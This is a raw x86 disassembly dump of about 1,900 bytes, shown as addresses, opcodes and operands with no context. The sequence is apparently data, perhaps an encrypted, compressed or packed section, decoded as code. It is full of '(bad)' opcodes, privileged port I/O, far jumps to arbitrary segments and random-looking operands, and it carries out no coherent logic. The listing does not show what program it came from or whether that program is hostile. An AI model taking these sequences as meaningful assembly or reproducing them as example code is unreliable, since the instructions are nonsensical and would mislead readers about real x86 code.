  41a0b9:	and    BYTE PTR [eax+0x5750f68c],0x58
  41a0c0:	cdq    
  41a0c1:	push   esi
  41a0c2:	cmp    edi,eax
  41a0c4:	test   DWORD PTR [ebp-0xbca6067],ebx
  41a0ca:	mov    ah,0xbf
  41a0cc:	mul    BYTE PTR ds:0x9cb491ff
  41a0d2:	loop   0x41a066
  41a0d4:	pushf  
  41a0d5:	cmp    al,0x7c
  41a0d7:	fisubr WORD PTR [edx-0x6334cb13]
  41a0dd:	sub    eax,edx
  41a0df:	in     eax,0x64
  41a0e1:	test   DWORD PTR [ebx],0x33445622
  41a0e7:	sbb    DWORD PTR [eax+0x3323895a],esi
  41a0ed:	fiadd  WORD PTR [ebp+0x76]
  41a0f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0f1:	cmp    BYTE PTR [ebx],0x79
  41a0f4:	call   0xac60:0x1603b4b6
  41a0fb:	adc    bl,BYTE PTR [ebx-0x1b]
  41a0fe:	stos   DWORD PTR es:[edi],eax
  41a0ff:	and    dh,BYTE PTR [ecx]
  41a101:	push   edi
  41a102:	(bad)  
  41a103:	adc    al,0x14
  41a105:	mov    ebp,0x55a782c9
  41a10a:	inc    eax
  41a10b:	mov    dl,0xf0
  41a10d:	ror    DWORD PTR [edx+0x53533dd9],cl
  41a113:	mov    ebp,0x3ab8b44a
  41a118:	xchg   ebx,eax
  41a119:	jb     0x41a179
  41a11b:	ins    BYTE PTR es:[edi],dx
  41a11c:	in     eax,dx
  41a11d:	jl     0x41a15c
  41a11f:	out    0x79,al
  41a121:	popf   
  41a122:	xchg   edx,eax
  41a123:	daa    
  41a124:	mov    ds:0x96af5ca,al
  41a129:	add    DWORD PTR [edi],ebx
  41a12b:	rcr    DWORD PTR [eax+eiz*2],1
  41a12e:	pop    ds
  41a12f:	pop    ecx
  41a130:	loopne 0x41a18f
  41a132:	aas    
  41a133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a134:	bound  eax,QWORD PTR [ebp-0x50194f2c]
  41a13a:	sar    DWORD PTR [ecx+edx*2-0x5c],cl
  41a13e:	aam    0xc5
  41a140:	aas    
  41a141:	mov    edx,0xbe1eab
  41a146:	mov    ds:0x5cb27251,al
  41a14b:	addr16 add al,0x7
  41a14e:	sub    BYTE PTR [ecx],cl
  41a150:	das    
  41a151:	adc    al,0xdb
  41a153:	add    eax,0x63890104
  41a158:	jae    0x41a13c
  41a15a:	stos   DWORD PTR es:[edi],eax
  41a15b:	cmp    eax,0x862c2b80
  41a160:	std    
  41a161:	and    cl,ch
  41a163:	jnp    0x41a123
  41a165:	inc    eax
  41a166:	fistp  QWORD PTR [ebx-0x1cd1fafe]
  41a16c:	mov    eax,0x3efd8f21
  41a171:	pop    ds
  41a172:	and    al,0xa1
  41a174:	bound  esi,QWORD PTR [edi+edx*4]
  41a177:	and    DWORD PTR [ebx-0x64],ebp
  41a17a:	popf   
  41a17b:	cmp    eax,0x817bca69
  41a180:	xchg   esp,ebx
  41a182:	mov    ecx,0x2c34813f
  41a187:	dec    edi
  41a188:	data16 sbb al,0x68
  41a18b:	daa    
  41a18c:	bound  edi,QWORD PTR [ecx-0x38b29b7c]
  41a192:	dec    ebx
  41a193:	sbb    dh,BYTE PTR [ebp-0x278d4ab1]
  41a199:	(bad)  
  41a19a:	push   esi
  41a19b:	iret   
  41a19c:	jb     0x41a16a
  41a19e:	xchg   ecx,eax
  41a19f:	icebp  
  41a1a0:	pop    eax
  41a1a1:	push   edi
  41a1a2:	mov    ds:0x1c079c,al
  41a1a7:	pop    esi
  41a1a8:	xchg   ecx,eax
  41a1a9:	iret   
  41a1aa:	sub    edx,esp
  41a1ac:	pop    ds
  41a1ad:	cmp    eax,0x912395ee
  41a1b2:	add    DWORD PTR [esi+0x36f4f3b8],ebp
  41a1b8:	push   0x1e
  41a1ba:	test   DWORD PTR [esi-0x6cce3e4a],ebx
  41a1c0:	sbb    ebx,DWORD PTR [edx-0x1]
  41a1c3:	pop    es
  41a1c4:	nop    DWORD PTR [edi-0x66582c59]
  41a1cb:	idiv   DWORD PTR [ecx+edx*4]
  41a1ce:	pop    edi
  41a1cf:	pushf  
  41a1d0:	inc    edi
  41a1d1:	rep stos BYTE PTR es:[edi],al
  41a1d3:	mov    ds:0xc218afae,eax
  41a1d8:	xchg   esi,eax
  41a1d9:	fmul   DWORD PTR [esi+0x309e4127]
  41a1df:	pop    esp
  41a1e0:	adc    eax,0xc77a2976
  41a1e5:	mov    ecx,0x6603d2fe
  41a1ea:	mov    ah,0x5d
  41a1ec:	(bad)  
  41a1ee:	xor    dl,BYTE PTR [edx]
  41a1f0:	jp     0x41a1f9
  41a1f2:	dec    ecx
  41a1f3:	pop    edx
  41a1f4:	pop    ds
  41a1f5:	loop   0x41a1fe
  41a1f7:	pop    esi
  41a1f8:	jmp    0x41a1ee
  41a1fa:	repnz dec ebx
  41a1fc:	test   al,0xba
  41a1fe:	xor    ah,BYTE PTR [ecx]
  41a200:	sahf   
  41a201:	xor    dl,0xe7
  41a204:	lods   al,BYTE PTR ds:[esi]
  41a205:	mov    ds:0xc25dc9ff,al
  41a20a:	fisttp WORD PTR [eax+0x9]
  41a20d:	ret    
  41a20e:	jbe    0x41a287
  41a210:	push   ebp
  41a211:	pop    edi
  41a212:	pop    es
  41a213:	arpl   cx,bp
  41a215:	mov    bh,0xa
  41a217:	loop   0x41a19c
  41a219:	scas   eax,DWORD PTR es:[edi]
  41a21a:	mov    al,0x60
  41a21c:	(bad)  
  41a21d:	xor    BYTE PTR [eax+0x44],bh
  41a220:	cs pop esi
  41a222:	iret   
  41a223:	dec    edi
  41a224:	(bad)  
  41a225:	jns    0x41a222
  41a227:	mov    BYTE PTR [ebx],bl
  41a229:	jae    0x41a1ff
  41a22b:	jmp    0x2649bbe0
  41a230:	fs xchg bh,ah
  41a233:	or     DWORD PTR [ebx],ecx
  41a235:	push   ebp
  41a236:	mov    cl,0xad
  41a238:	lods   eax,DWORD PTR ds:[esi]
  41a239:	pop    ebx
  41a23a:	sbb    ch,BYTE PTR [ecx-0x51]
  41a23d:	xor    dh,ch
  41a23f:	pop    edx
  41a240:	add    BYTE PTR [edx-0x1cceccdb],0x41
  41a247:	and    DWORD PTR [ebp+0x3806fd48],ebx
  41a24d:	push   esi
  41a24e:	daa    
  41a24f:	push   ebp
  41a250:	pop    ds
  41a251:	shl    ah,0xca
  41a254:	and    DWORD PTR [ebx+0x2cac233b],ebp
  41a25a:	stos   BYTE PTR es:[edi],al
  41a25b:	enter  0xf97d,0xbf
  41a25f:	jmp    0xb6c6:0xdc2fd621
  41a266:	shr    DWORD PTR [edx+0x54394ad2],1
  41a26c:	mov    eax,ds:0x61b4b30b
  41a271:	popa   
  41a272:	loopne 0x41a2e0
  41a274:	pop    es
  41a275:	jg     0x41a2a8
  41a277:	and    esi,ebp
  41a279:	mov    edx,0x6bb20135
  41a27e:	dec    esp
  41a27f:	cs ret 
  41a281:	push   ecx
  41a282:	fiadd  WORD PTR ds:0xab9eb7e0
  41a288:	mov    ch,0x36
  41a28a:	inc    edi
  41a28b:	or     eax,0x5197b3b3
  41a290:	and    eax,0xeffa61c2
  41a295:	jmp    0x41a29f
  41a297:	cmp    BYTE PTR [ebx+0x43],dh
  41a29a:	sub    DWORD PTR [esi],edi
  41a29c:	fisub  WORD PTR [esp+edx*1-0x15]
  41a2a0:	mov    dh,0x46
  41a2a2:	stc    
  41a2a3:	cmp    al,0x24
  41a2a5:	cmp    eax,0x9d657094
  41a2aa:	lods   al,BYTE PTR ds:[esi]
  41a2ab:	inc    esp
  41a2ac:	add    BYTE PTR [esi],ch
  41a2ae:	pop    esi
  41a2af:	sub    al,0x10
  41a2b1:	push   ebx
  41a2b2:	loope  0x41a2ef
  41a2b4:	push   eax
  41a2b5:	repz retf 
  41a2b7:	inc    ebx
  41a2b8:	and    al,0x98
  41a2ba:	xor    DWORD PTR [eax+esi*1-0x8a70827],edx
  41a2c1:	lds    esp,FWORD PTR [ecx+0x6b2a2869]
  41a2c7:	cwde   
  41a2c8:	stos   DWORD PTR es:[edi],eax
  41a2c9:	fistp  DWORD PTR [ebx+0x5833c0da]
  41a2cf:	push   cs
  41a2d0:	arpl   WORD PTR [ebx],bp
  41a2d2:	pop    eax
  41a2d3:	(bad)  
  41a2d4:	mov    bh,0xde
  41a2d6:	int    0xdc
  41a2d8:	(bad)  
  41a2d9:	mov    al,ds:0xd4f92838
  41a2de:	aaa    
  41a2df:	ins    DWORD PTR es:[edi],dx
  41a2e0:	dec    esi
  41a2e1:	fwait
  41a2e2:	jbe    0x41a2b0
  41a2e4:	ret    0xdaab
  41a2e7:	inc    ebp
  41a2e8:	adc    ch,BYTE PTR [ebx+0x1592018b]
  41a2ee:	inc    esp
  41a2ef:	mov    ebx,0x264ab8fb
  41a2f4:	cdq    
  41a2f5:	imul   esp,DWORD PTR ds:0xd221c977,0x7c5269ba
  41a2ff:	aas    
  41a300:	sbb    DWORD PTR [esp+edx*1-0x66f41fb2],ebx
  41a307:	sub    edi,DWORD PTR [esi]
  41a309:	je     0x41a34e
  41a30b:	xchg   ecx,eax
  41a30c:	data16 (bad) 
  41a30e:	mov    eax,0x71bd10c6
  41a313:	fbstp  TBYTE PTR [ebp+0x60]
  41a316:	pop    si
  41a318:	adc    cl,BYTE PTR [ebp+0xe]
  41a31b:	int3   
  41a31c:	dec    ebx
  41a31d:	adc    cl,BYTE PTR [ebx]
  41a31f:	push   ebx
  41a320:	fsubr  QWORD PTR [esi]
  41a322:	xchg   ebx,eax
  41a323:	clc    
  41a324:	bound  esi,QWORD PTR [edi-0x51]
  41a327:	in     eax,dx
  41a328:	les    edx,FWORD PTR [ebx+0x683fc124]
  41a32e:	mov    al,0xc
  41a330:	xchg   ebx,eax
  41a331:	inc    eax
  41a332:	(bad)  [eax]
  41a334:	mov    dh,0x65
  41a336:	fstp   DWORD PTR [esi]
  41a338:	mov    DWORD PTR [edx],esi
  41a33a:	mov    al,ds:0x9fc88a2c
  41a33f:	mov    eax,0x698f7842
  41a344:	xor    eax,0x1dff904c
  41a349:	into   
  41a34a:	add    al,0x61
  41a34c:	daa    
  41a34d:	xor    DWORD PTR [edx+edi*2],0x2e86da27
  41a354:	jbe    0x41a310
  41a356:	hlt    
  41a357:	mov    dl,BYTE PTR [edi]
  41a359:	jae    0x41a3d1
  41a35b:	xchg   edx,eax
  41a35c:	cmp    eax,0x9319fd72
  41a361:	xchg   edi,eax
  41a362:	inc    edx
  41a363:	(bad)  
  41a364:	hlt    
  41a365:	or     eax,0xea5775a6
  41a36a:	out    dx,eax
  41a36b:	push   ecx
  41a36c:	call   0x1f5d7955
  41a371:	scas   al,BYTE PTR es:[edi]
  41a372:	loop   0x41a3f1
  41a374:	das    
  41a375:	shl    BYTE PTR [eax-0x4c2355af],cl
  41a37b:	inc    ebp
  41a37c:	mov    edi,DWORD PTR [edi+0x30233432]
  41a382:	xchg   esp,ebx
  41a384:	hlt    
  41a385:	inc    ecx
  41a386:	icebp  
  41a387:	out    dx,eax
  41a388:	mov    ecx,0x8dd0e424
  41a38d:	dec    ebx
  41a38e:	sbb    eax,0xefc47a98
  41a393:	dec    ebx
  41a394:	les    esi,FWORD PTR [edi-0x55]
  41a397:	addr16 push edi
  41a399:	push   cs
  41a39a:	dec    edx
  41a39b:	push   0x43d35ed6
  41a3a0:	dec    ecx
  41a3a1:	or     DWORD PTR ds:0xf160ef76,ecx
  41a3a7:	(bad)
  41a3aa:	xor    eax,0xf10457fc
  41a3af:	scas   al,BYTE PTR es:[edi]
  41a3b0:	mov    ecx,DWORD PTR [ebx-0x63]
  41a3b3:	ja     0x41a38f
  41a3b5:	out    0x8a,al
  41a3b7:	xchg   esp,eax
  41a3b8:	fscale 
  41a3ba:	push   ebx
  41a3bb:	mov    bl,0xbb
  41a3bd:	pop    cx
  41a3bf:	fs not BYTE PTR ds:[ebp-0x17]
  41a3c4:	push   edx
  41a3c5:	jge    0x41a34d
  41a3c7:	lea    edx,[edx+0x56f4a3db]
  41a3cd:	or     eax,0x10ea38ef
  41a3d2:	mov    ah,0xca
  41a3d4:	xor    al,0x51
  41a3d6:	in     eax,dx
  41a3d7:	inc    ecx
  41a3d8:	idiv   BYTE PTR [esi-0x27]
  41a3db:	cmc    
  41a3dc:	adc    DWORD PTR [edx+0x11b48fc6],0xe
  41a3e3:	out    0x74,eax
  41a3e5:	outs   dx,DWORD PTR ds:[esi]
  41a3e6:	mov    eax,ds:0x529517fa
  41a3eb:	cmp    al,0x5d
  41a3ed:	int3   
  41a3ee:	cmp    eax,0xe818c83e
  41a3f3:	out    0x36,eax
  41a3f5:	cli    
  41a3f6:	push   0x175a6c1
  41a3fb:	fnstsw WORD PTR [ebx-0x45ce5a9c]
  41a401:	add    al,0x3e
  41a403:	sub    eax,0x15ca1bd8
  41a408:	aam    0x62
  41a40a:	jp     0x41a452
  41a40c:	sbb    esp,DWORD PTR [edi+0x83af02f]
  41a412:	repnz push esp
  41a414:	aas    
  41a415:	test   eax,0xf823ec7b
  41a41a:	or     bl,BYTE PTR [ebp-0x6d]
  41a41d:	test   BYTE PTR [eax-0x214320f2],bl
  41a423:	enter  0x9ba5,0x82
  41a427:	sbb    BYTE PTR [edi-0x32f90043],ch
  41a42d:	and    bh,bh
  41a42f:	popf   
  41a430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a431:	out    0xe7,al
  41a433:	shl    BYTE PTR [eax],1
  41a435:	mov    bh,dl
  41a437:	or     eax,0x835f1785
  41a43c:	mov    BYTE PTR [edi-0x51],bh
  41a43f:	stos   BYTE PTR es:[edi],al
  41a440:	xor    bh,bh
  41a442:	(bad)  
  41a443:	mov    dh,0x7e
  41a445:	cmp    al,0xe5
  41a447:	adc    eax,0x8fb48e8c
  41a44c:	call   0xdf01:0xa8f91320
  41a453:	retf   
  41a454:	fnsave [ebp+0x7611a7]
  41a45a:	fucomip st,st(3)
  41a45c:	lods   eax,DWORD PTR ds:[esi]
  41a45d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a45e:	rol    edi,1
  41a460:	xlat   BYTE PTR ds:[ebx]
  41a461:	not    DWORD PTR [eax+0xa898e49]
  41a467:	and    ebp,esi
  41a469:	adc    ch,BYTE PTR [edi-0x2e]
  41a46c:	inc    ebp
  41a46d:	xor    al,dl
  41a46f:	cmp    al,0x2e
  41a471:	dec    esi
  41a472:	and    BYTE PTR [ebp+0x37fabc87],0x1
  41a479:	dec    esp
  41a47a:	fdivr  DWORD PTR [esi+0x4f]
  41a47d:	adc    BYTE PTR [edi+0x18],bh
  41a480:	lsl    ebp,WORD PTR [eax-0x74]
  41a484:	sub    eax,0x32dac86a
  41a489:	outs   dx,BYTE PTR ds:[esi]
  41a48a:	popf   
  41a48b:	add    DWORD PTR [ebx+0x61],esp
  41a48e:	add    dh,ch
  41a490:	sub    bl,BYTE PTR [eax-0x16]
  41a493:	scas   eax,DWORD PTR es:[edi]
  41a494:	dec    esp
  41a495:	cmp    al,0x3b
  41a497:	push   eax
  41a498:	test   BYTE PTR [edx+0x20],bl
  41a49b:	sub    eax,0x990b3aa1
  41a4a0:	push   esp
  41a4a1:	(bad)  
  41a4a2:	push   esi
  41a4a3:	pop    es
  41a4a4:	mov    ecx,0x446e4da1
  41a4a9:	and    edx,DWORD PTR [edx-0x4]
  41a4ac:	mov    ecx,0x7fbb431c
  41a4b1:	in     eax,0xe
  41a4b3:	push   cs
  41a4b4:	push   ecx
  41a4b5:	add    dl,BYTE PTR [ebx+0x7b]
  41a4b8:	xchg   BYTE PTR [ecx],ch
  41a4ba:	jg     0x41a4ce
  41a4bc:	xor    DWORD PTR [esi-0x4f68d5db],ebx
  41a4c2:	cmp    BYTE PTR [eax+0xd],ch
  41a4c5:	js     0x41a4cb
  41a4c7:	inc    ebx
  41a4c8:	adc    esi,DWORD PTR [esi]
  41a4ca:	jle    0x41a529
  41a4cc:	add    al,0xf8
  41a4ce:	xor    ecx,ebx
  41a4d0:	xor    eax,0x6198f1e5
  41a4d5:	sbb    BYTE PTR [ebx],bl
  41a4d7:	mov    bh,0x9
  41a4d9:	push   es
  41a4da:	(bad)  
  41a4db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4dc:	xlat   BYTE PTR ds:[ebx]
  41a4dd:	ds imul ebx,ecx,0x58669f12
  41a4e4:	lods   al,BYTE PTR ds:[esi]
  41a4e5:	and    eax,0x379bcbf5
  41a4ea:	pop    esp
  41a4eb:	add    esp,DWORD PTR [ecx+0x9]
  41a4ee:	je     0x41a4d9
  41a4f0:	out    0xf3,al
  41a4f2:	xchg   edx,eax
  41a4f3:	gs mov dl,0x9a
  41a4f6:	fcomp  QWORD PTR [ecx+0x2f]
  41a4f9:	in     eax,dx
  41a4fa:	cmp    dh,BYTE PTR [ebx-0x41]
  41a4fd:	cmp    al,0xaf
  41a4ff:	fiadd  WORD PTR [eax-0x11b9fe32]
  41a505:	pop    ebp
  41a506:	(bad)  
  41a507:	aaa    
  41a508:	in     eax,0xfa
  41a50a:	js     0x41a4d7
  41a50c:	jle    0x41a580
  41a50e:	jecxz  0x41a53b
  41a510:	push   0xffffffab
  41a512:	fistp  DWORD PTR [eax-0x78]
  41a515:	push   edi
  41a516:	add    al,0x80
  41a518:	and    BYTE PTR [edi+0x1b92b5d0],ch
  41a51e:	lods   eax,DWORD PTR ds:[esi]
  41a51f:	sub    DWORD PTR [edi+0x6a4945c],esi
  41a525:	fsub   QWORD PTR [ecx-0x76]
  41a528:	sbb    BYTE PTR fs:[ebp-0x4b53f994],0xad
  41a530:	aas    
  41a531:	or     eax,0x7229660b
  41a536:	mov    bl,0x2b
  41a538:	mov    dl,0x22
  41a53a:	imul   eax,DWORD PTR [edi],0x24
  41a53d:	add    DWORD PTR [ecx-0x26909ed8],ebp
  41a543:	mov    ds:0x1c69e401,al
  41a548:	icebp  
  41a549:	sub    eax,0x1f57ac90
  41a54e:	jo     0x41a517
  41a550:	xor    al,0x7c
  41a552:	cmp    BYTE PTR [ecx],cl
  41a554:	je     0x41a4e2
  41a556:	fmul   QWORD PTR [esi-0x61]
  41a559:	in     eax,dx
  41a55a:	retf   
  41a55b:	mov    ds:0x19451c34,eax
  41a560:	aam    0xdc
  41a562:	adc    al,0xde
  41a564:	inc    eax
  41a565:	jg     0x41a514
  41a567:	mov    cl,0x1d
  41a569:	xchg   esi,eax
  41a56a:	mov    ?,WORD PTR fs:[edi+ebx*8-0x7a0e7d50]
  41a572:	ror    eax,1
  41a574:	inc    ebx
  41a575:	popf   
  41a576:	jno    0x41a5a7
  41a578:	mov    ebx,0x1d96b9ca
  41a57d:	jae    0x41a549
  41a57f:	outs   dx,DWORD PTR ds:[esi]
  41a580:	mov    ecx,0x1241777b
  41a585:	and    DWORD PTR [ebx-0x4],0x21d30c8d
  41a58c:	loopne 0x41a534
  41a58e:	jne    0x41a56d
  41a590:	xchg   esi,eax
  41a591:	sub    al,0xbc
  41a593:	lahf   
  41a594:	pop    eax
  41a595:	fs mov edi,0x4e728cf8
  41a59b:	into   
  41a59c:	out    0xcd,al
  41a59e:	(bad)  
  41a59f:	xchg   edx,eax
  41a5a0:	adc    edi,DWORD PTR [ebx+0x3c]
  41a5a3:	outs   dx,BYTE PTR ds:[esi]
  41a5a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5a5:	or     dh,BYTE PTR [esi-0x28]
  41a5a8:	jle    0x41a620
  41a5aa:	or     bl,0x50
  41a5ad:	icebp  
  41a5ae:	xlat   BYTE PTR ds:[ebx]
  41a5af:	adc    DWORD PTR [esi+0x13],esi
  41a5b2:	or     BYTE PTR [edi-0x16],0xa0
  41a5b6:	lods   al,BYTE PTR ds:[esi]
  41a5b7:	out    dx,al
  41a5b8:	ror    BYTE PTR [ebx-0x1017df72],0xe0
  41a5bf:	push   eax
  41a5c0:	mov    ebx,0xe12dc9f5
  41a5c5:	loope  0x41a600
  41a5c7:	sub    bh,BYTE PTR [esi+esi*4+0x40880593]
  41a5ce:	ins    BYTE PTR es:[edi],dx
  41a5cf:	arpl   WORD PTR [eax+ebp*2+0x18],di
  41a5d3:	mov    dh,0xa6
  41a5d5:	mov    BYTE PTR [edi-0x6e23e05f],0x1a
  41a5dc:	mov    dl,0xea
  41a5de:	into   
  41a5df:	push   0x30e1c2c6
  41a5e4:	(bad)  
  41a5e5:	in     al,0x86
  41a5e7:	mov    bh,0x9f
  41a5e9:	add    BYTE PTR [ecx],bl
  41a5eb:	mov    al,ds:0x2db4579e
  41a5f0:	test   eax,0xd0334f4c
  41a5f5:	les    edi,FWORD PTR [ebx+edx*2]
  41a5f8:	sbb    ch,BYTE PTR [eax]
  41a5fa:	add    ebp,DWORD PTR [edi+0x65]
  41a5fd:	mov    al,ds:0x33e0d3c7
  41a602:	adc    al,0x9f
  41a604:	mov    es,ecx
  41a606:	jo     0x41a63c
  41a608:	push   ebp
  41a609:	xor    eax,0x2c98515c
  41a60e:	sbb    eax,0x5dc54de4
  41a613:	inc    esp
  41a614:	or     DWORD PTR [esi-0x2cc8f785],edi
  41a61a:	pushf  
  41a61b:	shr    DWORD PTR [esi],cl
  41a61d:	pop    ebp
  41a61e:	imul   ecx,esp,0x56
  41a621:	push   es
  41a622:	push   0xa9c155e3
  41a627:	popa   
  41a628:	call   0xa0639ce3
  41a62d:	mov    cs,WORD PTR [ebp-0x144de8b9]
  41a633:	mov    al,0x7d
  41a635:	cmp    ah,al
  41a637:	sbb    bh,BYTE PTR [edx-0xe]
  41a63a:	(bad)  
  41a63b:	cmp    al,0xd3
  41a63d:	mov    si,0x651c
  41a641:	mov    ds:0xf9d2bc91,eax
  41a646:	push   esp
  41a647:	jno    0x41a66a
  41a649:	test   al,0x6a
  41a64b:	daa    
  41a64c:	cli    
  41a64d:	(bad)  
  41a64e:	pop    eax
  41a64f:	xchg   DWORD PTR ds:[ecx],edx
  41a652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a654:	mov    ecx,DWORD PTR ds:0x3b6789b7
  41a65a:	(bad)  
  41a65b:	xchg   edi,eax
  41a65c:	xchg   edi,eax
  41a65d:	ss xchg edi,eax
  41a65f:	inc    edi
  41a660:	push   0xd2957b09
  41a665:	add    esi,DWORD PTR [edx+0x735f408e]
  41a66b:	or     ah,dl
  41a66d:	loope  0x41a61c
  41a66f:	leave  
  41a670:	aam    0x35
  41a672:	dec    edi
  41a673:	imul   ebp,ecx,0xfffffffc
  41a676:	mov    ebx,0x5d352dd9
  41a67b:	add    eax,DWORD PTR [ecx]
  41a67d:	push   0x1ba5e67d
  41a682:	dec    bl
  41a684:	iret   
  41a685:	(bad)  
  41a686:	scas   al,BYTE PTR es:[edi]
  41a687:	lock jae 0x41a646
  41a68a:	fldcw  WORD PTR [edx]
  41a68c:	pop    esi
  41a68d:	jg     0x41a661
  41a68f:	fisubr DWORD PTR [ecx-0x2a]
  41a692:	jns    0x41a69a
  41a694:	push   ecx
  41a695:	test   BYTE PTR [edx-0x5e],bh
  41a698:	pop    ecx
  41a699:	sti    
  41a69a:	sub    ecx,eax
  41a69c:	test   DWORD PTR [edi+eiz*4],0x78e401ad
  41a6a3:	or     eax,DWORD PTR ds:0x1f2c22e4
  41a6a9:	or     dh,bl
  41a6ab:	or     BYTE PTR [ecx-0x4a],bh
  41a6ae:	add    edi,edi
  41a6b0:	pop    ss
  41a6b1:	retf   
  41a6b2:	loope  0x41a6ab
  41a6b4:	jmp    0x78ea8422
  41a6b9:	aas    
  41a6ba:	sbb    bh,BYTE PTR [ebp+ebp*4-0xb]
  41a6be:	inc    esp
  41a6bf:	nop
  41a6c0:	retf   0x5644
  41a6c3:	idiv   DWORD PTR [ecx-0x44]
  41a6c6:	mov    DWORD PTR [edx-0x6c],ebp
  41a6c9:	xchg   ebp,eax
  41a6ca:	fadd   DWORD PTR [esi-0x2c87b815]
  41a6d0:	test   al,0x26
  41a6d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6d3:	push   esi
  41a6d4:	xor    al,0x4
  41a6d6:	dec    esi
  41a6d7:	repz jp 0x41a69b
  41a6da:	aaa    
  41a6db:	out    dx,al
  41a6dc:	adc    eax,0xc495fb23
  41a6e1:	sbb    esi,esi
  41a6e3:	push   ss
  41a6e4:	retf   
  41a6e5:	xchg   esi,eax
  41a6e6:	cs sbb dl,ch
  41a6e9:	imul   esi,DWORD PTR [ebx],0xcaad01c4
  41a6ef:	mov    ds:0x40eaabba,eax
  41a6f4:	imul   eax,DWORD PTR [eax],0x77cacbfa
  41a6fa:	jmp    0xc6f9b04d
  41a6ff:	call   0xbf10:0xcb9547fd
  41a706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a707:	xchg   edi,eax
  41a708:	xchg   esp,eax
  41a709:	shl    BYTE PTR [eax],0xd0
  41a70c:	aas    
  41a70d:	mov    ecx,fs
  41a70f:	pop    ebp
  41a710:	adc    esi,eax
  41a712:	enter  0xc91c,0x76
  41a716:	test   bh,cl
  41a718:	scas   eax,DWORD PTR es:[edi]
  41a719:	shl    DWORD PTR [ecx],0x28
  41a71c:	fwait
  41a71d:	fwait
  41a71e:	or     eax,0xaf09bf44
  41a723:	add    ecx,DWORD PTR ds:0x5f7d232a
  41a729:	imul   esp,DWORD PTR [esi],0x21269b5e
  41a72f:	or     eax,0x37bce9c5
  41a734:	lahf   
  41a735:	or     dh,BYTE PTR [ebx-0x41]
  41a738:	inc    ecx
  41a739:	cmp    DWORD PTR [edx],ecx
  41a73b:	dec    edx
  41a73c:	push   eax
  41a73d:	inc    edx
  41a73e:	lahf   
  41a73f:	test   al,0xb7
  41a741:	adc    BYTE PTR [ecx],0x27
  41a744:	fisubr DWORD PTR [eax+edx*2]
  41a747:	jge    0x41a7c2
  41a749:	call   0x6065ef3c
  41a74e:	jns    0x41a6ed
  41a750:	adc    eax,0x51a3490
  41a755:	div    ah
  41a757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a759:	jns    0x41a7b7
  41a75b:	inc    esi
  41a75c:	and    BYTE PTR [esi-0x22ab4dd],bl
  41a762:	frstor [edx+0x47b0fee8]
  41a768:	or     bl,ch
  41a76a:	fwait
  41a76b:	jo     0x41a742
  41a76d:	push   ecx
  41a76e:	jbe    0x41a715
  41a770:	fnclex 
  41a772:	cmp    al,0x3
  41a774:	mov    al,ds:0x10e111f3
  41a779:	xor    al,0xce
  41a77b:	sbb    DWORD PTR [edi],0xdc4db368
  41a781:	xor    al,0xb7
  41a783:	mov    ah,0x6
  41a785:	sub    BYTE PTR [esi-0x40],dh
  41a788:	cdq    
  41a789:	xor    DWORD PTR [ebp+0x72],esp
  41a78c:	mov    ah,0xcf
  41a78e:	and    DWORD PTR [ecx-0x1d],edi
  41a791:	sti    
  41a792:	xchg   ebx,eax
  41a793:	out    0x3f,eax
  41a795:	in     al,0x43
  41a797:	sbb    BYTE PTR [esp+edx*4],0xdd
  41a79b:	test   BYTE PTR [edi-0x467ec87a],dh
  41a7a1:	dec    esp
  41a7a2:	ror    bh,0x25
  41a7a5:	stc    
  41a7a6:	xchg   ebp,ebx
  41a7a8:	push   ebx
  41a7a9:	cmp    DWORD PTR [eax],0x5d
  41a7ac:	pop    ebp
  41a7ad:	or     DWORD PTR [edx],0xdff138ba
  41a7b3:	push   esi
  41a7b4:	and    al,dh
  41a7b6:	fwait
  41a7b7:	daa    
  41a7b8:	(bad)  
  41a7ba:	mov    edi,0xaf9b4b33
  41a7bf:	xchg   DWORD PTR [edx+0x2dd4efe9],ecx
  41a7c5:	test   ecx,edi
  41a7c7:	dec    ecx
  41a7c8:	(bad)  
  41a7c9:	sub    cl,BYTE PTR [edx-0x52f7b21a]
  41a7cf:	in     eax,dx
  41a7d0:	add    esp,DWORD PTR [ebp-0x17c92180]
  41a7d6:	daa    
  41a7d7:	retf   0xe9da
  41a7da:	es mov cl,0x9e
  41a7dd:	sub    DWORD PTR [ecx+0x69],esp
  41a7e0:	and    esi,DWORD PTR [eax-0x1646c282]
  41a7e6:	mov    dl,0x7a
  41a7e8:	sbb    ecx,DWORD PTR [ebp-0x3f]
  41a7eb:	dec    edx
  41a7ec:	mov    ah,dh
  41a7ee:	and    ecx,ebx
  41a7f0:	mov    DWORD PTR [eax-0x27d5afc5],esp
  41a7f6:	cli    
  41a7f7:	scas   eax,DWORD PTR es:[edi]
  41a7f8:	inc    edi
  41a7f9:	inc    ebp
  41a7fa:	dec    esp
  41a7fb:	nop
  41a7fc:	dec    ebp
  41a7fd:	std    
  41a7fe:	mov    dl,0x2
  41a800:	out    dx,eax
  41a801:	push   esi
  41a802:	fld    DWORD PTR [edi-0x54d5995f]
  41a808:	jne    0x41a84a
  41a80a:	test   al,0x33
  41a80c:	xchg   edi,eax
  41a80d:	inc    ebp
  41a80e:	or     al,0xc4
  41a810:	int    0x20
  41a812:	adc    BYTE PTR ds:0x686e0f9c,dl
  41a818:	adc    BYTE PTR [ebx+0x18c720cd],dl
  41a81e:	xchg   DWORD PTR [ebx+0x79],esi
  41a821:	lods   eax,DWORD PTR ds:[esi]
  41a822:	inc    ebp
  41a823:	cmp    BYTE PTR [eax+0x724dfc19],0xb4
  41a82a:	imul   edx,DWORD PTR [ebx-0x28],0x365d50f5
  41a831:	pop    ecx
  41a832:	fild   QWORD PTR [ecx]
  41a834:	sub    dh,BYTE PTR [ebp-0xf]
  41a837:	mov    BYTE PTR [ecx],dh
  41a839:	jns    0x41a7ce
  41a83b:	je     0x41a8a3
  41a83d:	ficomp DWORD PTR [eax-0x3a418362]
  41a843:	hlt    
